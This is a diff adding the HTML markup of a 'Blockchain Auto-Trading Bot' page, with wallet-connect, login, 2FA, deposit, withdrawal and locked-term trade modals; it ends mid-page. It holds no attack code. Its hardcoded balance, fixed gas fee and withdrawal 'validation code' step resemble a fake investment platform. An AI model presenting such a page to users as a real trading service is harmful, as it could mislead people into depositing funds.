@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Blockchain Auto-Trading Bot</title>
+  <meta name="theme-color" content="#0b0f14"/>
+  <link rel="manifest" href="manifest.json">
+  <link rel="icon" type="image/png" sizes="192x192" href="app-logo.png">
+  <link rel="apple-touch-icon" href="app-logo.png">
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- TradingView -->
+  <script src="https://s3.tradingview.com/tv.js"></script>
+  <!-- ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <!-- web3modal, walletconnect, tronweb, bitcoinjs-lib (for BTC address validate) -->
+  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+  <!-- otplib for TOTP/Google Authenticator -->
+  <script src="https://cdn.jsdelivr.net/npm/otplib@12.0.1/otplib.umd.min.js"></script>
+  <!-- QRious for QR code generation -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+  <style>
+    .tab-active img { filter: invert(100%) sepia(0%) saturate(0%) hue-rotate(0deg) brightness(100%) contrast(100%); }
+    .coin-row:hover { background: rgba(255,255,255,0.02); }
+    .tv-container { border-radius: 8px; overflow: hidden; background: #0b0f14; border: 1px solid rgba(255,255,255,0.03); }
+    .install-prompt { background: #222; color: #fff; border-radius: 12px; box-shadow: 0 2px 32px #0008; padding: 28px; z-index: 50; position: fixed; top: 20%; left:50%; transform:translateX(-50%); max-width: 340px; width: 94vw; }
+    .btn { padding: 0.5em 1.2em; border-radius: 6px; font-weight: 500; }
+    .btn-primary { background: #f0b90b; color: #222; }
+    .btn-secondary { background: #24262b; color: #fff; }
+    .modal { background: rgba(0,0,0,0.75); position: fixed; z-index: 50; top:0;left:0;right:0;bottom:0; display:flex;align-items:center;justify-content:center; }
+    .modal-content { background:#181a20; border-radius:12px; padding:28px; max-width:96vw; width:380px; color:#fff; }
+    .sheet { position:fixed; left:0; right:0; bottom:0; background:#181a20; border-top-left-radius:18px; border-top-right-radius:18px; box-shadow:0 -4px 32px #0006; z-index:55; }
+    .sheet-content { padding:20px 18px; }
+    .fade { transition: opacity 0.3s; }
+    .notif-pop { background: #151818; color: #f0b90b; border-radius: 8px; font-size: 15px; position: fixed; top: 60px; left: 0; right: 0; margin: 0 auto; max-width: 360px; padding: 10px 20px; z-index: 44; border:1px solid #f0b90b44; box-shadow: 0 2px 12px #0004; }
+    .fadein { animation: fadein 0.5s; }
+    @keyframes fadein { from{ opacity:0; } to{opacity:1;} }
+    .input-black-text { color: #000 !important; background: #fff !important; }
+    .hide { display:none !important; }
+    .show { display:block !important; }
+    /* TradingView mobile style mimic */
+    .tv-mobile-btn { background: #23262f; color: #f0b90b; border-radius: 8px; font-weight: 500; padding: 8px 16px; margin: 6px 0; }
+    .tv-mobile-footer { background: #101014; border-top: 1px solid #23262f; padding: 8px 0 6px 0; display: flex; justify-content: space-between; }
+    .tv-mobile-footer button { flex:1; margin: 0 2px; }
+    /* Custom scrollbars */
+    ::-webkit-scrollbar { width: 7px; background: #111;}
+    ::-webkit-scrollbar-thumb { background: #25262b; border-radius: 7px;}
+    /* Responsive tweaks */
+    @media (max-width:480px) {
+      .modal-content, .sheet-content { width: 98vw; max-width: 98vw; }
+      .notif-pop { max-width: 95vw; }
+    }
+  </style>
+</head>
+<body class="bg-black text-white font-sans min-h-screen">
+  <!-- NOTIF POPUP -->
+  <div id="notifPop" class="notif-pop fadein hide"></div>
+
+  <!-- INSTALL PROMPT -->
+  <div id="installPrompt" class="install-prompt hide">
+    <h3 class="text-lg font-semibold mb-2">Install App</h3>
+    <p>Install Blockchain Auto-Trading Bot for the best experience!</p>
+    <div style="display:flex;gap:12px;margin-top:16px;">
+      <button class="btn btn-primary" id="installNowBtn">Install Now</button>
+      <button class="btn btn-secondary" id="maybeLaterBtn">Maybe Later</button>
+    </div>
+  </div>
+
+  <!-- WALLET CONNECT MODAL (populated by JS) -->
+  <div id="walletModal" class="modal hide" aria-modal="true">
+    <div class="modal-content" style="max-width:400px">
+      <div class="flex justify-between items-center mb-3">
+        <div class="font-bold text-lg">Connect Wallet</div>
+        <button id="closeWalletModal" aria-label="Close">&times;</button>
+      </div>
+      <div>
+        <button id="connectMetaMask" class="w-full my-2 btn btn-primary">MetaMask</button>
+        <button id="connectWalletConnect" class="w-full my-2 btn btn-secondary">WalletConnect</button>
+        <button id="connectTron" class="w-full my-2 btn btn-secondary">TronLink</button>
+        <button id="manualAddress" class="w-full my-2 btn btn-secondary">Manual Address</button>
+      </div>
+      <div id="manualAddressInput" class="my-2 hide">
+        <input id="manualInput" class="w-full input-black-text rounded px-2 py-2 my-1" placeholder="Paste Wallet Address...">
+        <button id="manualConfirm" class="w-full btn btn-primary mt-2">Confirm</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- LOGIN MODAL -->
+  <div id="loginModal" class="modal hide" aria-modal="true">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Login with Account ID</div>
+      <input id="loginInput" class="w-full input-black-text rounded px-2 py-2 my-1" placeholder="Enter your 10-digit Account ID" maxlength="10">
+      <button id="loginConfirm" class="w-full btn btn-primary mt-3">Confirm</button>
+      <div id="loginMsg" class="text-center text-sm text-gray-400 mt-3"></div>
+    </div>
+  </div>
+
+  <!-- ACCOUNT DETAILS MODAL -->
+  <div id="accountModal" class="modal hide" aria-modal="true">
+    <div class="modal-content">
+      <div class="font-bold text-lg">Account Details</div>
+      <div class="my-3">
+        <div class="text-xs text-gray-400">Connected Address</div>
+        <div id="accModalAddr" class="break-all"></div>
+        <div class="text-xs text-gray-400 mt-2">Wallet Account ID</div>
+        <div id="accModalID" class="break-all"></div>
+        <div class="text-xs text-gray-400 mt-2">Balance</div>
+        <div id="accModalBal" class="break-all"></div>
+      </div>
+      <button id="secureAccBtn" class="w-full btn btn-secondary my-2">Secure Account</button>
+      <button id="closeAccModal" class="w-full btn btn-primary my-2">Close</button>
+    </div>
+  </div>
+
+  <!-- 2FA GOOGLE AUTH MODAL -->
+  <div id="authModal" class="modal hide" aria-modal="true">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Google Authenticator (2FA)</div>
+      <div class="text-xs text-gray-400">Wallet Account ID</div>
+      <div id="authAccID" class="mb-2"></div>
+      <div class="text-xs text-gray-400">Scan QR code in Google Authenticator app</div>
+      <canvas id="gaQR" style="margin:12px auto;display:block;"></canvas>
+      <div class="text-xs text-gray-400">Secret Key</div>
+      <div id="gaSecret" class="break-all mb-2"></div>
+      <input id="gaCode" class="w-full input-black-text rounded px-2 py-2 my-2" maxlength="6" placeholder="Enter 6-digit code">
+      <button id="gaVerifyBtn" class="w-full btn btn-primary">Verify Code</button>
+      <div id="gaMsg" class="text-center text-sm text-gray-400 mt-2"></div>
+      <button id="gaCloseBtn" class="w-full btn btn-secondary mt-2">Close</button>
+    </div>
+  </div>
+
+  <!-- WITHDRAW SHEET -->
+  <div id="withdrawSheet" class="sheet hide">
+    <div class="sheet-content">
+      <div class="font-bold text-lg mb-3">Withdraw</div>
+      <button class="w-full btn btn-primary my-2" id="onChainTransferBtn">On-Chain Transfer</button>
+      <button class="w-full btn btn-secondary my-2" id="userAccIDBtn">User Account ID</button>
+      <button class="w-full btn btn-secondary my-2" id="closeWithdrawSheet">Cancel</button>
+    </div>
+  </div>
+
+  <!-- WITHDRAW DETAIL MODAL -->
+  <div id="withdrawDetailModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Withdraw Details</div>
+      <div class="mb-2">
+        <label class="text-xs text-gray-400">Withdrawal Address</label>
+        <input id="wdAddr" class="w-full input-black-text rounded px-2 py-2 mt-1 mb-2" placeholder="Destination address">
+        <button class="btn btn-secondary w-full my-1" id="fillFromWallet">Fill From Connected Wallet</button>
+      </div>
+      <div class="mb-2">
+        <label class="text-xs text-gray-400">Select Network</label>
+        <select id="wdNetwork" class="w-full input-black-text rounded px-2 py-2 mt-1">
+          <option value="Ethereum">Ethereum (ERC-20)</option>
+          <option value="Bitcoin">Bitcoin (BTC)</option>
+          <option value="BNB">BNB Smart Chain (BEP20)</option>
+          <option value="Tron">Tron (TRC-20)</option>
+        </select>
+      </div>
+      <div class="mb-2 flex items-center">
+        <label class="text-xs text-gray-400 flex-1">Amount</label>
+        <input id="wdAmt" type="number" min="0" step="0.0001" class="flex-1 input-black-text rounded px-2 py-2" style="max-width:110px" placeholder="0.00">
+        <button class="btn btn-secondary ml-2" id="wdMaxBtn">Max</button>
+      </div>
+      <div class="mb-2 text-xs text-yellow-500">Gas fee: 0.034 bnb</div>
+      <button class="btn btn-primary w-full mt-2" id="wdSubmitBtn">Withdraw</button>
+      <button class="btn btn-secondary w-full mt-2" id="closeWithdrawDetail">Cancel</button>
+      <div id="wdDetailMsg" class="text-center mt-2 text-red-400"></div>
+    </div>
+  </div>
+
+  <!-- WITHDRAW CODE MODAL -->
+  <div id="withdrawCodeModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Enter Validation Code</div>
+      <input id="wdCodeInput" class="w-full input-black-text rounded px-2 py-2 mt-1" maxlength="6" placeholder="6-digit code">
+      <button class="btn btn-primary w-full mt-3" id="wdCodeSubmit">Submit</button>
+      <div id="wdCodeMsg" class="text-center text-sm text-gray-400 mt-2"></div>
+      <button class="btn btn-secondary w-full mt-2" id="closeWithdrawCode">Cancel</button>
+    </div>
+  </div>
+
+  <!-- WITHDRAW PROCESSING MODAL -->
+  <div id="withdrawProcessModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Withdrawal Processing</div>
+      <div class="text-xs text-gray-400">Address</div>
+      <div id="wpAddr"></div>
+      <div class="text-xs text-gray-400 mt-2">Network</div>
+      <div id="wpNetwork"></div>
+      <div class="text-xs text-gray-400 mt-2">Amount</div>
+      <div id="wpAmt"></div>
+      <div class="text-xs text-gray-400 mt-2">Time Remaining</div>
+      <div id="wpCountdown" class="font-bold"></div>
+      <button class="btn btn-secondary w-full mt-3" id="wpViewDetails">View withdrawal details</button>
+      <button class="btn btn-primary w-full mt-2" id="wpCloseBtn">Close</button>
+    </div>
+  </div>
+
+  <!-- WITHDRAW SUCCESS MODAL -->
+  <div id="withdrawSuccessModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Withdrawal Successful</div>
+      <div id="wsDetails" class="mb-2"></div>
+      <button class="btn btn-primary w-full mt-2" id="wsCloseBtn">Close</button>
+    </div>
+  </div>
+
+  <!-- DEPOSIT MODAL -->
+  <div id="depositModal" class="modal hide">
+    <div class="modal-content" style="max-width:460px">
+      <div class="flex justify-between items-center mb-2">
+        <div class="font-bold text-lg">Deposit</div>
+        <button id="closeDepositModal" aria-label="Close">&times;</button>
+      </div>
+      <input id="depositSearch" class="w-full input-black-text rounded px-2 py-2 my-1" placeholder="Search coin to deposit...">
+      <div id="depositCoinList" class="max-h-52 overflow-auto mt-2"></div>
+    </div>
+  </div>
+
+  <!-- DEPOSIT NETWORK MODAL -->
+  <div id="depositNetworkModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Select Network</div>
+      <div id="depositNetList"></div>
+      <button class="btn btn-secondary w-full mt-2" id="closeDepositNetModal">Cancel</button>
+    </div>
+  </div>
+
+  <!-- DEPOSIT ADDRESS MODAL -->
+  <div id="depositAddressModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Deposit Address</div>
+      <div class="text-xs text-gray-400 mb-1">Network</div>
+      <div id="depNetLabel"></div>
+      <div class="text-xs text-gray-400 mt-2 mb-1">Address</div>
+      <div id="depAddrLabel" class="break-all"></div>
+      <canvas id="depQrCanvas" style="margin:12px auto;display:block;"></canvas>
+      <button class="btn btn-primary w-full mt-2" id="copyDepAddr">Copy Address</button>
+      <button class="btn btn-secondary w-full mt-2" id="closeDepositAddrModal">Close</button>
+    </div>
+  </div>
+
+  <!-- TRADE MODALS -->
+  <div id="tradeModal" class="modal hide">
+    <div class="modal-content">
+      <div class="flex justify-between items-center mb-2">
+        <div class="font-bold text-lg">Trading</div>
+        <button id="closeTradeModal" aria-label="Close">&times;</button>
+      </div>
+      <div>
+        <div class="mb-2">Total Trade Balance: <span id="tradeBal"></span></div>
+        <div class="mb-2">Total Earnings: <span id="tradeEarn"></span></div>
+        <div class="mb-2">Total Returns: <span id="tradeRet"></span></div>
+        <button class="btn btn-primary w-full mt-2" id="placeTradeBtn">Place Trade</button>
+        <button class="btn btn-secondary w-full mt-2" id="viewEarningsBtn">View Earnings</button>
+        <button class="btn btn-secondary w-full mt-2" id="tradeTransferBtn">Transfer</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- TRADE ASSET MODAL -->
+  <div id="tradeAssetModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Select Asset</div>
+      <div id="tradeAssetList" class="max-h-60 overflow-auto"></div>
+      <button class="btn btn-secondary w-full mt-2" id="closeTradeAssetModal">Cancel</button>
+    </div>
+  </div>
+
+  <!-- TRADE DURATION MODAL -->
+  <div id="tradeDurModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Trade Duration</div>
+      <select id="tradeDurSelect" class="w-full input-black-text rounded px-2 py-2 mt-1 mb-3">
+        <option value="">Select duration...</option>
+        <option value="1">1 month</option>
+        <option value="2">2 months</option>
+        <option value="3">3 months</option>
+        <option value="4">4 months</option>
+        <option value="5">5 months</option>
+        <option value="6">6 months</option>
+        <option value="7">7 months</option>
+        <option value="8">8 months</option>
+        <option value="9">9 months</option>
+        <option value="10">10 months</option>
+        <option value="11">11 months</option>
+        <option value="12">12 months</option>
+      </select>
+      <button class="btn btn-primary w-full mt-2" id="tradeDurConfirm">Confirm</button>
+      <button class="btn btn-secondary w-full mt-2" id="closeTradeDurModal">Cancel</button>
+    </div>
+  </div>
+
+  <!-- TRADE PLACE ORDER MODAL -->
+  <div id="tradePlaceOrderModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Place Order</div>
+      <div id="tradeOrderAsset"></div>
+      <div id="tradeOrderDur"></div>
+      <button class="btn btn-primary w-full mt-3" id="tradeOrderBtn">Activate Trade</button>
+      <button class="btn btn-secondary w-full mt-2" id="closeTradeOrderModal">Cancel</button>
+    </div>
+  </div>
+
+  <!-- TRADE EARNINGS MODAL -->
+  <div id="tradeEarningsModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Trade Earnings</div>
+      <div id="tradeEarnBal"></div>
+      <button class="btn btn-primary w-full mt-3" id="earningsTransferBtn">Transfer</button>
+      <button class="btn btn-secondary w-full mt-2" id="closeTradeEarningsModal">Close</button>
+    </div>
+  </div>
+
+  <!-- TRADE TRANSFER MODAL -->
+  <div id="tradeTransferModal" class="modal hide">
+    <div class="modal-content">
+      <div class="font-bold text-lg mb-2">Transfer Funds</div>
+      <div class="mb-2 flex items-center">
+        <label class="text-xs text-gray-400 flex-1">Amount</label>
+        <input id="transferAmt" type="number" min="0" step="0.0001" class="flex-1 input-black-text rounded px-2 py-2" style="max-width:110px" placeholder="0.00">
+      </div>
+      <div class="mb-2">
+        <select id="transferType" class="w-full input-black-text rounded px-2 py-2 mt-1">
+          <option value="main">Transfer to Main Wallet</option>
+          <option value="trade">Transfer to Trade Account</option>
+        </select>
+      </div>
+      <button class="btn btn-primary w-full mt-2" id="transferBtn">Transfer</button>
+      <button class="btn btn-secondary w-full mt-2" id="closeTransferModal">Cancel</button>
+    </div>
+  </div>
+
+  <!-- TRADEVIEW CHART MODAL -->
+  <div id="tradeChartModal" class="modal hide">
+    <div class="modal-content" style="max-width:500px">
+      <div class="flex justify-between items-center mb-2">
+        <div class="font-bold text-lg">Trading Chart</div>
+        <button id="closeTradeChartModal" aria-label="Close">&times;</button>
+      </div>
+      <div id="tradingviewChart" class="tv-container" style="height:320px;"></div>
+    </div>
+  </div>
+
+  <!-- HEADER -->
+  <header id="mainHeader" class="flex items-center justify-between px-4 py-3 border-b border-gray-800 sticky top-0 bg-black z-20">
+    <div class="flex items-center gap-3">
+      <img src="app-logo.png" alt="Logo" class="w-7 h-7 rounded" />
+      <div class="text-sm">
+        <div class="font-semibold">Blockchain Bot</div>
+        <div class="text-xs text-gray-400">Lite / Pro</div>
+      </div>
+    </div>
+    <div class="flex-1 px-3 hidden sm:block">
+      <!-- search bar only on large screens -->
+      <input id="globalSearch" type="search" placeholder="Search coins, pairs or features" class="w-full input-black-text text-sm px-3 py-2 rounded-md border border-gray-700 focus:outline-none" />
+      <div id="searchPanel" class="hidden mt-2 bg-gray-900 border border-gray-800 rounded-md max-h-56 overflow-auto text-sm">
+        <div id="searchResults" class="p-2"></div>
+      </div>
+    </div>
+    <div class="flex items-center gap-3 ml-3">
+      <!-- QR -->
+      <button title="QR Scanner" class="p-1" id="qrBtn">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" aria-label="QR Scanner" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+          <rect x="3" y="3" width="8" height="8" rx="1" />
+          <rect x="13" y="3" width="8" height="8" rx="1" />
+          <rect x="3" y="13" width="8" height="8" rx="1" />
+          <rect x="13" y="13" width="8" height="8" rx="1" />
+        </svg>
+      </button>
+      <!-- Notifications -->
+      <button id="notifBtn" title="Notifications" class="p-1">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" aria-label="Notifications" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6 6 0 00-9.33-4.95" />
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9.5 19a2.5 2.5 0 005 0" />
+        </svg>
+      </button>
+      <!-- Settings -->
+      <button id="settingsBtn" title="Settings" class="p-1">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" aria-label="Settings" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+          <circle cx="12" cy="12" r="3" />
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+            d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 8 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 5 15.4a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 5 8.6a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 8.6 5a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09c.46.21.87.54 1 1.51a1.65 1.65 0 0 0 1.82.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19 8.6a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09c-.21.46-.54.87-1.51 1z" />
+        </svg>
+      </button>
+      <!-- More -->
+      <div class="relative">
+        <button id="moreBtn" class="p-1">
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" aria-label="More" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+            <circle cx="12" cy="5" r="1.5" />
+            <circle cx="12" cy="12" r="1.5" />
+            <circle cx="12" cy="19" r="1.5" />
+          </svg>
+        </button>
+        <div id="moreMenu" class="hidden absolute right-0 mt-2 w-48 bg-gray-900 border border-gray-800 rounded-md shadow-lg text-sm">
+          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="connectedWalletBtn">Connected Wallet</a>
+          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="settingsMenuBtn">Settings</a>
+          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="supportBtn">Support</a>
+          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="closeAccBtn">Close Account</a>
+          <a href="#" class="block px-4 py-2 hover:bg-gray-800" id="disconnectBtn">Disconnect</a>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN PAGES -->
+  <main id="main" class="pb-28">
+    <!-- LANDING PAGE -->
+    <section id="landingPage" class="page p-4">
+      <div class="flex flex-col items-center mt-10">
+        <img src="app-logo.png" class="w-16 h-16 mb-2 rounded" alt="App Logo">
+        <h1 class="text-2xl font-bold mb-1 text-yellow-400">Blockchain Auto-Trading Bot</h1>
+        <div class="text-center text-gray-300 mb-4">Automate your trading with AI on blockchain. Connect your wallet and start earning with Binance-level speed and security.</div>
+        <div class="flex flex-col gap-3 w-full max-w-xs mb-4">
+          <button id="connectWalletBtn" class="btn btn-primary w-full">Connect Wallet</button>
+          <button id="loginIdBtn" class="btn btn-secondary w-full">Login ID</button>
+          <button id="getMobileAppBtn" class="btn btn-primary w-full">Get Mobile App</button>
+        </div>
+        <div class="font-semibold text-lg mt-7 mb-2">Market Overview</div>
+        <div id="landingMarket" class="w-full max-w-md mx-auto"></div>
+        <div class="font-semibold text-lg mt-7 mb-2">Top Coins</div>
+        <div id="landingTopCoins" class="w-full max-w-md mx-auto"></div>
+      </div>
+    </section>
+
+    <!-- HOME PAGE -->
+    <section id="home" class="page hidden p-4">
+      <!-- Save Account Popup -->
+      <div id="saveAccPopup" class="modal hide" aria-modal="true">
+        <div class="modal-content">
+          <div class="font-bold text-lg mb-3">Save Account Details</div>
+          <div class="mb-2 text-sm">Please save your account info below. You will need this to log in again.</div>
+          <button id="showAccountBtn" class="btn btn-primary w-full my-2">Show Account Details</button>
+          <button id="closeSaveAccPopup" class="btn btn-secondary w-full my-2">Close</button>
+        </div>
+      </div>
+      <!-- Market notification auto -->
+      <div id="homeMarketNotif" class="notif-pop hide"></div>
+      <div class="mb-3">
+        <div class="flex items-start justify-between">
+          <div>
+            <div class="text-xs text-gray-400">Wallet ID</div>
+            <div id="walletId" class="text-lg font-semibold mt-1">0000000000</div>
+          </div>
+          <div class="text-right">
+            <div class="text-xs text-gray-400">Total Balance</div>
+            <div id="totalBalance" class="text-2xl font-bold mt-1">$8,250.78</div>
+          </div>
+        </div>
+      </div>
+      <!-- Actions above holdings -->
+      <div class="flex gap-2 mb-4">
+        <button id="depositBtn" class="btn btn-primary flex-1">Deposit</button>
+        <button id="swapBtn" class="btn btn-secondary flex-1">Swap</button>
+        <button id="withdrawBtn" class="btn btn-primary flex-1">Withdraw</button>
+      </div>
+      <!-- Holdings -->
+      <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
+        <div class="flex items-center justify-between">
+          <div class="flex items-center gap-3">
+            <img id="usdtLogo" src="" class="w-8 h-8 rounded" alt="USDT logo" />
+            <div>
+              <div class="font-semibold">Tether USD (USDT)</div>
+              <div id="usdtPrice" class="text-sm text-gray-400">$8250.78</div>
+            </div>
+          </div>
+        </div>
+        <!-- Connected Wallet actions -->
+        <div class="mt-3 flex gap-3">
+          <button class="flex-1 px-3 py-2 bg-gray-800 rounded text-sm" id="transactionsBtn">Transactions</button>
+          <button class="flex-1 px-3 py-2 bg-gray-800 rounded text-sm" id="activityBtn">Activity</button>
+        </div>
+      </div>
+      <!-- Quick Market Highlights -->
+      <div class="mt-4">
+        <div class="flex items-center justify-between mb-2">
+          <div class="font-semibold">Live Market Performance</div>
+          <div class="text-xs text-gray-400">BTC / USDT</div>
+        </div>
+        <div class="tv-container" id="tvchart" style="height:320px;"></div>
+      </div>
+      <!-- Top coins and market overview -->
+      <div class="mt-4 grid grid-cols-1 gap-3">
+        <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
+          <div class="flex items-center justify-between mb-2">
+            <div class="font-semibold">Top Coins</div>
+            <button id="refreshMarkets" class="text-xs text-gray-400 hover:text-white">Refresh</button>
+          </div>
+          <div id="topCoinsList" class="space-y-2 text-sm"></div>
+        </div>
+        <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
+          <div class="flex items-center justify-between mb-2">
+            <div class="font-semibold">Gainers & Losers (24h)</div>
+            <div class="text-xs text-gray-400">Updated</div>
+          </div>
+          <div class="grid grid-cols-2 gap-2 text-sm">
+            <div id="gainers" class="space-y-1"></div>
+            <div id="losers" class="space-y-1"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- MARKETS PAGE -->
+    <section id="markets" class="page hidden p-4">
+      <div class="flex items-center justify-between mb-3">
+        <div class="text-xl font-bold">Markets</div>
+        <div class="text-sm text-gray-400">Spot / Futures</div>
+      </div>
+      <div class="bg-gray-900 border border-gray-800 rounded-md p-2">
+        <div class="flex items-center gap-3 mb-2">
+          <input id="marketSearch" type="text" placeholder="Search markets (e.g., BTC, ETH)" class="flex-1 input-black-text border border-gray-800 px-3 py-2 rounded text-sm" />
+          <button id="marketRefresh" class="px-3 py-2 bg-gray-800 rounded text-sm">Refresh</button>
+        </div>
+        <div id="marketsList" class="max-h-[52vh] overflow-auto"></div>
+      </div>
+    </section>
+
+    <!-- TRADE PAGE -->
+    <section id="trade" class="page hidden p-4">
+      <div class="text-xl font-bold mb-2">Trade (Spot)</div>
+      <div class="grid grid-cols-1 gap-3">
+        <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
+          <div class="flex items-center gap-3">
+            <select id="tradeSymbol" class="bg-gray-800 px-2 py-2 rounded text-sm">
+              <option value="BINANCE:BTCUSDT">BTC/USDT</option>
+              <option value="BINANCE:ETHUSDT">ETH/USDT</option>
+              <option value="BINANCE:BNBUSDT">BNB/USDT</option>
+            </select>
+            <button id="loadSymbol" class="px-3 py-2 bg-gray-800 rounded text-sm">Load Chart</button>
+          </div>
+        </div>
+        <div class="tv-container" id="tradeChart" style="height:340px;"></div>
+        <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
+          <div class="font-semibold mb-2">Convert</div>
+          <div class="flex gap-2">
+            <input id="convertFrom" placeholder="Amount" class="flex-1 input-black-text border border-gray-800 px-3 py-2 rounded text-sm" />
+            <select id="convertPair" class="bg-gray-800 px-2 py-2 rounded text-sm">
+              <option>USDT → BTC</option>
+              <option>BTC → USDT</option>
+              <option>USDT → ETH</option>
+            </select>
+          </div>
+          <div class="mt-3 flex gap-2">
+            <button id="convertBtn" class="flex-1 px-3 py-2 bg-yellow-500 text-black rounded">Convert</button>
+            <button id="placeOrderBtn" class="flex-1 px-3 py-2 bg-gray-800 rounded">Trade</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FUTURES PAGE -->
+    <section id="futures" class="page hidden p-4">
+      <div class="text-xl font-bold mb-3">Futures</div>
+      <div class="tv-container" id="futuresChart" style="height:420px;"></div>
+      <div class="mt-3 bg-gray-900 border border-gray-800 rounded-md p-3">
+        <div class="flex items-center justify-between">
+          <div class="font-semibold">Futures Pairs</div>
+          <div class="text-sm text-gray-400">Simulated</div>
+        </div>
+        <div id="futuresList" class="mt-3 text-sm"></div>
+      </div>
+    </section>
+
+    <!-- WALLETS PAGE -->
+    <section id="wallets" class="page hidden p-4">
+      <div class="text-xl font-bold mb-3">Wallets</div>
+      <div class="bg-gray-900 border border-gray-800 rounded-md p-3">
+        <div class="flex items-center justify-between">
+          <div>
+            <div class="text-xs text-gray-400">Wallet ID</div>
+            <div id="walletId2" class="font-semibold mt-1">0000000000</div>
+          </div>
+          <div class="text-right">
+            <div class="text-xs text-gray-400">Total Balance</div>
+            <div id="totalBalance2" class="text-lg font-bold mt-1">$8,250.78</div>
+          </div>
+        </div>
+        <div class="mt-3">
+          <div class="font-semibold mb-2">Holdings</div>
+          <div id="walletHoldings" class="space-y-2 text-sm"></div>
+        </div>
+        <div class="mt-3">
+          <div class="font-semibold mb-2">Recent Transactions</div>
+          <div id="recentTx" class="text-sm text-gray-400">No transactions — demo mode.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SETTINGS PAGE -->
+    <section id="settingsPage" class="page hidden p-4">
+      <div class="text-xl font-bold mb-3">Settings</div>
+      <div class="bg-gray-900 border border-gray-800 rounded-md p-3 mb-4">
+        <div class="mb-2 flex items-center justify-between">
+          <div>Enable Notifications</div>
+          <label class="flex items-center cursor-pointer">
+            <input type="checkbox" id="notifToggle" class="form-checkbox h-5 w-5 text-yellow-500" />
+            <span class="ml-2 text-xs text-gray-400" id="notifToggleLabel"></span>
+          </label>
+        </div>
+        <div class="mb-2 flex items-center justify-between">
+          <div>Theme</div>
+          <select id="themeSelect" class="bg-gray-800 px-2 py-2 rounded text-sm">
+            <option value="dark">Dark</option>
+            <option value="light">Light</option>
+            <option value="system">System</option>
+          </select>
+        </div>
+        <div class="mb-2">
+          <button id="closeAccountBtn" class="btn btn-primary w-full mt-2">Close Account (2FA Required)</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- SUPPORT PAGE -->
+    <section id="supportPage" class="page hidden p-4">
+      <div class="text-xl font-bold mb-3">Support</div>
+      <div class="bg-gray-900 border border-gray-800 rounded-md p-3 mb-4">
+        <div class="font-bold mb-2">FAQs</div>
